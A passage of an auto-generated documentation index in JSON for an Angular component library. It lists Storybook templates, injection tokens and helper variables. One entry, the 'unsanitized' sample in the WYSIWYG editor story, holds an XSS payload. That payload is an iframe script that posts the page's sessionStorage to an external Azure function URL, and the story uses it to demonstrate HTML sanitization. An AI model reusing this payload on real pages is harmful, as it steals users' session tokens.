       }\n      ],\n      'hasDivider': true,\n      'svgIcon': false,\n      'icon': null\n    }\n  ]\n}"
                }
            ],
            "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts": [
                {
                    "name": "NAVIGATION_HOME_ICON",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
                    "type": "",
                    "defaultValue": "new InjectionToken<BreadcrumbConfig>('sto-home-icon')"
                }
            ],
            "libs/datatable/src/lib/swimlane-table.stories.ts": [
                {
                    "name": "NormalUse",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                },
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
                    "type": "Story<Record<string, unknown>>",
                    "defaultValue": "(args: Record<string, unknown>) => {\n  return {\n    props: args,\n    template: `<mat-card>\n<mat-card-title><h2>This replaces StoComplexDatatable and is only here for CSS</h2></mat-card-title>\n<ngx-datatable [loadingIndicator]=\"loading\"\n[footerHeight]=\"40\"\n[selectionType]=\"'single'\"\n[scrollbarV]=\"true\"\n[scrollbarH]=\"horizontalScroll\"\n[style.height.px]=\"height\"\n[rowHeight]=\"rowHeight\"\n[headerHeight]=\"headerHeight\"\n[class.sto-datatable]=\"withCss\"\n[rows]=\"rows\"\n[columns]=\"columns\"></ngx-datatable>\n</mat-card>`\n  };\n}"
                }
            ],
            "libs/datatable/src/lib/datatable.stories.ts": [
                {
                    "name": "NormalUse",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/datatable.stories.ts",
                    "type": "Story<StoDatatableComponent<Record<string, unknown>>>",
                    "defaultValue": "(args: StoDatatableComponent<Record<string, unknown>>) => {\n  return {\n    component: StoDatatableComponent,\n    props: {\n      ...args, columns: args.scrollbarH ? [ ...columns, ...columns, ...columns ] : columns,\n      rows: rows,\n      headerContextMenu: action('Header context menu'),\n      rowContextMenu: action('Row context menu'),\n      rowActivate: action('Keyboard-activation on row'),\n      select: action('Row selected'),\n      resized: action('Resize')\n    },\n  };\n}"
                }
            ],
            "libs/error-handler/src/lib/error-handler.stories.ts": [
                {
                    "name": "NormalUse",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/error-handler/src/lib/error-handler.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                },
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/error-handler/src/lib/error-handler.stories.ts",
                    "type": "Story<Record<string, unknown>>",
                    "defaultValue": "(args: Record<string, unknown> ) => {\n  return {\n    props: args,\n    template: `<next-wrapper></next-wrapper>`,\n  };\n}"
                }
            ],
            "libs/drawer/src/lib/sto-drawer/drawer.stories.ts": [
                {
                    "name": "NormalUse",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                },
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
                    "type": "Story<StoDrawerComponent>",
                    "defaultValue": "(args: StoDrawerComponent) => {\n  return {\n    component: StoDrawerComponent,\n    props: args,\n    template: `\n  <div>\n  <sto-drawer [position]=\"position\" [open]=\"open\" [animation]=\"animation\" [backdrop]=\"backdrop\">\n<sto-drawer-header>\n<div class=\"sto-drawer__header__title\">\n<h2>Title</h2>\n      </div>\n</sto-drawer-header>\n\n<mat-card class=\"sto-card\"><p>Content in drawer</p></mat-card>\n\n<sto-drawer-footer>\n<button mat-button color=\"primary\">Save</button>\n</sto-drawer-footer>\n</sto-drawer>\n\n\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n</div>\n`,\n\n  };\n}"
                }
            ],
            "libs/drawer/src/lib/sto-navigation/navigation.stories.ts": [
                {
                    "name": "NormalUse",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                },
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
                    "type": "Story<>",
                    "defaultValue": "(args: StoDrawerComponent) => {\n  const actions = {\n    handleCommand: action('Link pressed'),\n    topsNav: action('Open tops landing'),\n    toggle: action('Switch side'),\n    closeMenu: action('Close menu'),\n  };\n  return {\n    component: StoDrawerComponent,\n    props: { ...args, ...actions, navigation, subNavigation },\n    template: `<div>\n  <sto-drawer [open]=\"open\" [animation]=\"animation\" [backdrop]=\"backdrop\">\n<sto-drawer-header>\n<div class=\"sto-drawer__header__infix\">\n        <button *ngIf=\"activePane === 'right'; else topIcon\"\n                type=\"button\"\n                mat-icon-button\n                (click)=\"toggle(); activePane = 'left'\">\n          <mat-icon>arrow_back</mat-icon>\n        </button>\n        <ng-template #topIcon>\n          <button mat-icon-button\n          type=\"button\"\n          (click)=\"topsNav()\">\n            <mat-icon [class.sto-main-icon--test-environment]=\"testEnvironment\">settings</mat-icon>\n          </button>\n        </ng-template>\n      </div>\n<div class=\"sto-drawer__header__title\">\n        <ng-container *ngIf=\"activePane === 'right'; else leftName;\">\n          <span *ngIf=\"activePane === 'right'\">\n           {{rightMenu.name}}\n         </span>\n        </ng-container>\n        <ng-template #leftName>\n         <span *ngIf=\"activePane === 'left'\">\n           {{leftMenu.name}}\n         </span>\n        </ng-template>\n      </div>\n      <div class=\"sto-drawer__header__suffix\">\n        <button type=\"button\"\n                mat-icon-button\n                (click)=\"closeMenu(); open = false\">\n          <mat-icon>close</mat-icon>\n        </button>\n      </div>\n</sto-drawer-header>\n<sto-slide-panel class=\"sto-slide-panel\"\n                     [activePane]=\"activePane\">\n                     {{activePane}}\n<sto-navigation-menu [menu]=\"subNavigation\"\n*ngIf=\"activePane === 'right'\"\n                         (onCommand)=\"handleCommand('internal', $event.command)\"\n                         rightPane></sto-navigation-menu>\n<sto-navigation-menu [menu]=\"navigation\"\n*ngIf=\"activePane === 'left'\"\n                         (onCommand)=\"activePane = 'right'; handleCommand('root', $event.command)\"\n                         leftPane></sto-navigation-menu>\n                         </sto-slide-panel>\n</sto-drawer>\n\n\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n</div>`\n  };\n}"
                }
            ],
            "tools/scripts/copy-assets.ts": [
                {
                    "name": "out",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "tools/scripts/copy-assets.ts",
                    "type": "",
                    "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
                },
                {
                    "name": "root",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "tools/scripts/copy-assets.ts",
                    "type": "",
                    "defaultValue": "path.join(__dirname, '../../')"
                },
                {
                    "name": "scss",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "tools/scripts/copy-assets.ts",
                    "type": "",
                    "defaultValue": "path.join(src, 'style/**/*')"
                },
                {
                    "name": "src",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "tools/scripts/copy-assets.ts",
                    "type": "",
                    "defaultValue": "path.join(root, 'libs', 'core', 'src')"
                }
            ],
            "libs/form/src/lib/number-input/number-input.pipe.ts": [
                {
                    "name": "PADDING",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/number-input/number-input.pipe.ts",
                    "type": "string",
                    "defaultValue": "'000000000'"
                }
            ],
            "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts": [
                {
                    "name": "preferenceKey",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
                    "type": "string",
                    "defaultValue": "'TOPS_IM:UserPreferences'"
                }
            ],
            "libs/common/src/lib/preference-manager/preference-manager.stories.ts": [
                {
                    "name": "preferences",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
                    "type": "Preference[]",
                    "defaultValue": "[\n  { name: 'A filter', id: 'uuid', identifierKey: 'reports_filter', user: 'Bobby B', payload: {} },\n  { name: 'Another filter', id: 'uuid-2', identifierKey: 'reports_filter', user: 'Bobby B', default: true, payload: {} },\n]"
                },
                {
                    "name": "Usage",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
                    "type": "Story<PreferenceManagerComponent>",
                    "defaultValue": "(args: PreferenceManagerComponent) => {\n  return {\n    props: {\n      ...args,\n      filterForm: new FormControl(),\n      onSelect: function (id: string) {\n        this.activePreferenceId = id;\n        this.filterForm.reset();\n        action('Select preference')(id);\n      },\n      onSetDefault: function (pref: Preference) {\n        const preferences = this.preferences as Preference[];\n        const index = preferences.findIndex(p => p.id === pref.id);\n        const prefs: Preference[] = [ ...preferences ].map(p => ( { ...p, default: false } ));\n        prefs[ index ] = pref;\n        this.loadingIndicator = true;\n        action('Set default preference')(pref.name);\n        setTimeout(() => {\n          this.preferences = prefs;\n          this.loadingIndicator = false;\n        }, 300);\n      },\n      onEdit: function (pref: Preference) {\n        const preferences = this.preferences as Preference[];\n        const index = preferences.findIndex(p => p.id === pref.id);\n        const prefs = [ ...preferences ];\n        prefs[ index ] = pref;\n        // Set preference in payload\n        this.loadingIndicator = true;\n        this.filterForm.markAsPristine();\n        action('Edit preference')(`${pref.name} with id ${pref.id}`);\n\n        setTimeout(() => {\n          this.preferences = prefs;\n          this.loadingIndicator = false;\n        }, 300);\n      },\n      onDeletePreference: function (id: string) {\n        action('Delete preference')(id);\n        const preferences = this.prerences as Preference[];\n        const index = preferences.findIndex(p => p.id === id);\n        const prefs = [ ...preferences ];\n        prefs.splice(index, 1);\n        this.preferences = prefs;\n      },\n      onAdd: function (preference: Preference) {\n        action('Create preference')(preference);\n        preference.id = Date.now().toString(10);\n        this.preferences = [ ...this.preferences, preference ];\n      }\n    },\n    component: PreferenceManagerComponent,\n    template: `\n<sto-filter-panel [expandable]=\"true\" [expanded]=\"true\">\n  <sto-filter-title><sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\n                                            (editPreference)=\"onEdit($event)\"\n                                            (addNewPreference)=\"onAdd($event)\"\n                                            [dirty]=\"filterForm.dirty\"\n                                            (deletePreference)=\"onDeletePreference($event)\"\n                                            (selectPreference)=\"onSelect($event)\"\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\n                                            [activePreferenceId]=\"activePreferenceId\"\n                                            [preferences]=\"preferences\"></sto-preference-manager></sto-filter-title>\n  <input [formControl]=\"filterForm\" placeholder=\"Write stuff here to trigger modified\">\n  <button (click)=\"filterForm.reset(); filterForm.markAsPristine()\">And click to clear</button>\n</sto-filter-panel>\n\n<sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\n                                            (editPreference)=\"onEdit($event)\"\n                                            (addNewPreference)=\"onAdd($event)\"\n                                            [dirty]=\"filterForm.dirty\"\n                                            (deletePreference)=\"onDeletePreference($event)\"\n                                            (selectPreference)=\"onSelect($event)\"\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\n                                            [activePreferenceId]=\"activePreferenceId\"\n                                            [preferences]=\"preferences\"></sto-preference-manager>\n`\n  };\n}"
                }
            ],
            "apps/oilmod-web/src/app/app.component.stories.ts": [
                {
                    "name": "primary",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "apps/oilmod-web/src/app/app.component.stories.ts",
                    "type": "",
                    "defaultValue": "() => ({\n  moduleMetadata: {\n    imports: []\n  },\n  props: {\n  }\n})"
                }
            ],
            "libs/core/src/lib/styles.stories.ts": [
                {
                    "name": "StoCard",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/lib/styles.stories.ts",
                    "type": "Story<literal type>",
                    "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `<mat-card [class.sto-card]=\"withStyles\">\n<mat-card-title [class.sto-card__title]=\"withStyles\">Card Title</mat-card-title>\n<mat-card-subtitle [class.sto-card__subtitle]=\"withStyles\">Card Subtitle</mat-card-subtitle>\n<mat-card-content [class.sto-card__content]=\"withStyles\">Card Content In Here</mat-card-content>\n</mat-card>`\n} )"
                },
                {
                    "name": "StoDialog",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/lib/styles.stories.ts",
                    "type": "Story<Record<string, unknown>>",
                    "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `<app-dialog-demo [separatorLines]=\"separatorLines\"></app-dialog-demo>`,\n} )"
                },
                {
                    "name": "StoGrid",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/lib/styles.stories.ts",
                    "type": "Story<unknown>",
                    "defaultValue": "() => ( {\n  template: `\n<div class=\"sto-grid sto-grid--2\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--2</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--2</div>\n</div>\n<div class=\"sto-grid sto-grid--3\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--3</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--3</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--3</div>\n</div>\n<div class=\"sto-grid sto-grid--4\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n</div>\n<div class=\"sto-grid sto-grid--6\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n</div>\n  `,\n} )"
                },
                {
                    "name": "StoTheme",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/lib/styles.stories.ts",
                    "type": "Story<Record<string, unknown>>",
                    "defaultValue": "args => ( {\n  props: { ...args, colors: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] },\n  styles: [\n    `\n    .container { display: flex; }\n    .container > div {\n     flex: 0 1 auto;\n     padding-left: 16px;\n     }\n    `\n  ],\n  template: `\n  <mat-tab-group>\n  <mat-tab label=\"Buttons\">\n    <mat-card class=\"sto-card\">\n    <div *ngFor=\"let color of colors\">\n      <mat-card-subtitle class=\"sto-card__subtitle\">\n    <h2>{{ color }}</h2>\n</mat-card-subtitle>\n    <button mat-button [color]=\"color\">Mat Button</button>\n    <button mat-stroked-button [color]=\"color\">Mat stroked Button</button>\n    <button mat-flat-button [color]=\"color\">Mat flat Button</button>\n    <button mat-raised-button [color]=\"color\">Mat raised Button</button>\n    <button mat-icon-button [color]=\"color\"><mat-icon>home</mat-icon></button>\n</div>\n</mat-card>\n  </mat-tab>\n  <mat-tab label=\"Cards\">\n  <mat-card *ngFor=\"let c of colors\" [ngClass]=\"'mat-' + c\">\n  <mat-card-title>{{ c }}</mat-card-title>\n</mat-card>\n</mat-tab>\n<mat-tab label=\"Text\">\n<mat-card class=\"sto-card\">\n    <div class=\"container\">\n    <div>\n    <p *ngFor=\"let color of colors\" [ngClass]=\"'mat-' + color\">&lt;p&gt; {{ color }}</p>\n</div>\n<div>\n    <span *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;span&gt; {{ color }}\n</span>\n</div>\n<div>\n    <h2 *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;h[1|2|3|4|5]&gt; {{ color }}\n</h2>\n</div>\n</div>\n</mat-card>\n</mat-tab>\n</mat-tab-group>\n  `,\n} )"
                }
            ],
            "libs/core/src/lib/sto-directives/directives.stories.ts": [
                {
                    "name": "StoContextMenu",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
                    "type": "",
                    "defaultValue": "() => ( {\n  props: {\n    closed: action('Menu closed'),\n    log: action('Active menu info')\n  },\n  template: `<mat-card>\n<mat-card-title>Context menu</mat-card-title>\n  <button\n#overlay=\"stoMenuOverlay\"\n[matMenuTriggerRestoreFocus]=\"false\"\n(menuClosed)=\"closed()\"\nmat-button stoMenuOverlay #trigger=\"matMenuTrigger\" [matMenuTriggerFor]=\"menu\">Menu trigger button</button>\n<br>\n<br>\n<p>\n  Active Menu Index {{ activeMenuInfo }}\n</p>\n<br>\n<br>\n<div style=\"width: 500px; display: flex; justify-content: space-between\">\n<span [menuContext]=\"{index: 0}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 0</span>\n<span [menuContext]=\"{index: 1}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 1</span>\n<span [menuContext]=\"{index: 2}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 2</span>\n<span [menuContext]=\"{index: 3}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 3</span>\n</div>\n\n<mat-menu [backdropClass]=\"'backdrop-remove'\" [hasBackdrop]=\"false\" #menu=\"matMenu\">\n  <ng-template matMenuContent let-index=\"index\">\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log('index', index, $event)\">Index {{ index }}</button>\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(1, $event)\">Item 1</button>\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(2, $event)\">Item 2</button>\n  </ng-template>\n</mat-menu>\n</mat-card>`\n} )"
                },
                {
                    "name": "StoGrid",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
                    "type": "",
                    "defaultValue": "(args: Record<string, unknown>) => ( {\n  props: { ...args },\n  template: `<mat-card class=\"sto-card\">\n<div style=\"background: white;\" stoGrid [maxWidth]=\"1000\" [breakpoints]=\"breakpoints\">\n<div stoGridColumn style=\"background: lightblue;\">1 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">2 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">3 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">4 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">5 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">6 (col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">7 (double col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">8 (double col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" stoGridSpacer>9 (double spacer, hidden on 2-col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">10 (double col)</div>\n<div stoGridColumn style=\"background: lightblue;\">11 (col)</div>\n<div stoGridColumn stoGridSpacer>12 (spacer, hidden on 1-col)</div>\n<div stoGridColumn style=\"background: transparent;\" class=\"sto-form\"></div>\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\">13 (col spacer, hidden on 1-col grid)</div>\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\" [stoGridColumnDouble]=\"true\" >14 (double spacer, hidden on 2-col)</div>\n</div>\n</mat-card>`\n} )"
                }
            ],
            "libs/form/src/lib/sto-form/form-field.stories.ts": [
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
                    "type": "Story<>",
                    "defaultValue": "(args) => {\n  return {\n    component: FormFieldDirective,\n    props: args,\n    template: `\n  <mat-card class=\"sto-form\">\n<mat-form-field stoFormField *ngIf=\"withClasses\">\n<mat-label>Form field with styles</mat-label>\n<input value=\"Some value\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\n</mat-form-field>\n<mat-form-field stoFormField *ngIf=\"withClasses\">\n<mat-label>Form field with styles</mat-label>\n<mat-select><mat-option>A</mat-option></mat-select>\n</mat-form-field>\n<mat-form-field appearance=\"fill\" *ngIf=\"!withClasses\">\n<mat-label>Form field without styles</mat-label>\n<input value=\"Some value\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\n</mat-form-field>\n<mat-form-field stoFormField *ngIf=\"withClasses\">\n<mat-label>Text area with styles</mat-label>\n<textarea matInput [cdkTextareaAutosize]=\"true\">\nSome Text Content\n\nShould not select all on click\n</textarea>\n</mat-form-field>\n</mat-card>`\n  };\n}"
                },
                {
                    "name": "Usage",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                }
            ],
            "libs/form/src/lib/number-input/number-input.stories.ts": [
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/number-input/number-input.stories.ts",
                    "type": "Story<>",
                    "defaultValue": "(args) => {\n  return {\n    component: NumberInputComponent,\n    props: {\n      ...args,\n      change: action('Value changed'),\n      control: new FormControl(null, Validators.required),\n      toggleValidator: (ctrl: AbstractControl) => {\n        if ( ctrl.validator ) {\n          ctrl.clearValidators();\n        } else {\n          ctrl.setValidators(Validators.required);\n        }\n        ctrl.updateValueAndValidity();\n      },\n    },\n    template: `\n  <mat-card class=\"sto-form\" style=\"width: 600px\">\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\n  <button (click)=\"toggleValidator(control)\">Toggle validator</button><br>\n  <button (click)=\"control.markAsTouched()\">Touched</button><br>\n    <mat-form-field stoFormField floatLabel=\"always\">\n      <mat-label>{{label}}</mat-label>\n      <sto-number-input (ngModelChange)=\"change($event)\"\n            [dynamicFractionSize]=\"dynamicFractionSize\"\n                        [fractionSize]=\"fractionSize\"\n                        [readonly]=\"readonly\"\n                        [formControl]=\"control\"\n                        [placeholder]=\"placeholder\">\n      </sto-number-input>\n      <span matSuffix>{{ suffix }}</span>\n      <mat-error *ngIf=\"control.hasError('required')\">{{ control.getError('required') }}</mat-error>\n    </mat-form-field><br>\n    {{control.value}}\n  </mat-card>`\n  };\n}"
                },
                {
                    "name": "Usage",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/number-input/number-input.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                }
            ],
            "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts": [
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
                    "type": "Story<SlideToggleComponent>",
                    "defaultValue": "(args) => {\n  return {\n    component: SlideToggleComponent,\n    props: {\n      ...args,\n      ctrl: new FormControl(true),\n      valueChange: action('Value changed'),\n    },\n    template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\">\n  <button (click)=\"ctrl.disabled ? ctrl.enable() : ctrl.disable()\">Toggle disabled</button><br>\n<mat-form-field stoFormField floatLabel=\"always\">\n    <mat-label>Slide toggle</mat-label>\n    <sto-slide-toggle [color]=\"color\" [readonly]=\"readonly\" [formControl]=\"ctrl\" (ngModelChange)=\"valueChange($event)\"></sto-slide-toggle>\n</mat-form-field>\n</mat-card>`\n  };\n}"
                },
                {
                    "name": "Usage",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                }
            ],
            "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts": [
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                    "type": "Story<WysiwygComponent>",
                    "defaultValue": "(args) => {\n  const ctrl = new FormControl(unsanitized);\n  return {\n    props: { ...args, ctrl, unsanitized },\n    template: `\n<sto-wysiwyg [readonly]=\"readonly\" #wysiwyg [formControl]=\"ctrl\"></sto-wysiwyg>\n<hr>\n<div>\n<p>The text we're sending in is</p>\n<div style=\"background-color: lightgray\"><code>{{ unsanitized }}</code></div>\n<br>\n<p>The resulting HTML output is then sanitized </p>\n<div style=\"background-color: lightgray\"><code >{{ wysiwyg.value.changingThisBreaksApplicationSecurity }}</code></div>\n<p>While it gets sanitized in the wysiwyg editor, best practice dictates that sanitizing happens before sending it in\n(and preferable on your backend service)</p>\n</div>\n`\n  };\n}"
                },
                {
                    "name": "unsanitized",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                    "type": "",
                    "defaultValue": "`<iframe srcdoc=\"<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>\">\n</iframe>\n<b>This is bold.</b>\n`"
                },
                {
                    "name": "Usage",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                }
            ],
            "libs/common/src/lib/theme/theme-saver.service.ts": [
                {
                    "name": "THEME_SAVER",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/theme/theme-saver.service.ts",
                    "type": "",
                    "defaultValue": "new InjectionToken<ThemeSaver>('sto__theme__typo')"
                }
            ],
            "libs/common/src/lib/theme/models.ts": [
                {
                    "name": "themes",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/theme/models.ts",
                    "type": "",
                    "defaultValue": "new Map<ThemeName, ThemeClassName>([\n  [ 'light', 'sto-light-theme' ],\n  [ 'dark', 'sto-dark-theme' ],\n])"
                },
                {
                    "name": "typography",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/theme/models.ts",
                    "type": "",
                    "defaultValue": "new Map<TypographyName, TypographyClassName>([\n  [ 'small', 'sto-sm-typography' ],\n  [ 'medium', 'sto-m-typography' ],\n  [ 'large', 'sto-l-typography' ],\n])"
                }
            ],
            "libs/drawer/src/lib/sto-navigation/tokens.ts": [
                {
                    "name": "USE_HASH_ROUTING",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/drawer/src/lib/sto-navigation/tokens.ts",
                    "type": "",
                    "defaultValue": "new InjectionToken<boolean>('sto.nav.hash')"
                }
            ],
            "libs/form/src/lib/sto-wysiwyg/modifiers.ts": [
                {
                    "name": "validCommands",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
                    "type": "[]",
                    "defaultValue": "[\n  'bold',\n  'underline',\n  'italic',\n  'createLink',\n  'insertUnorderedList',\n  'insertOrderedList',\n  'removeFormat',\n]"
                }
            ]
        },
        "groupedFunctions": {
            "libs/error-handler/src/lib/wrapper.ts": [
                {
                    "name": "LoggerFactory",
                    "file": "libs/error-handler/src/lib/wrapper.ts",
                    "ctype": "miscellaneous",
                    "subtype": "function",
                    "description": "",
                    "args": [
                        {
                            "name": "http"
                        }
                    ],
                    "jsdoctags": [
                        {
                            "name": "http",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "tools/scripts/build-scss.ts": [
                {
                    "name": "processScss",
                    "file": "tools/scripts/build-scss.ts",
                    "ctype": "miscellaneous",
                    "subtype": "function",
                    "description": "",
                    "args": [
                        {
                            "name": "file"
                        },
                        {
                            "name": "outFile"
                        }
                    ],
                    "returnType": "Promise<void>",
                    "jsdoctags": [
                        {
                            "name": "file",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "outFile",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ]
        },
        "groupedEnumerations": {
            "libs/datatable/src/lib/sto-datatable/columns.ts": [
                {
                    "name": "ColumnDisplay",
                    "childs": [
                        {
                            "name": "Flex",
                            "value": "flex"
                        },
                        {
                            "name": "Force",
                            "value": "force"
                        }
                    ],
                    "ctype": "miscellaneous",
                    "subtype": "enum",
                    "description": "",
                    "file": "libs/datatable/src/lib/sto-datatable/columns.ts"
                }
            ],
            "libs/core/src/lib/abstract-and-interfaces/keyPress.enum.ts": [
                {
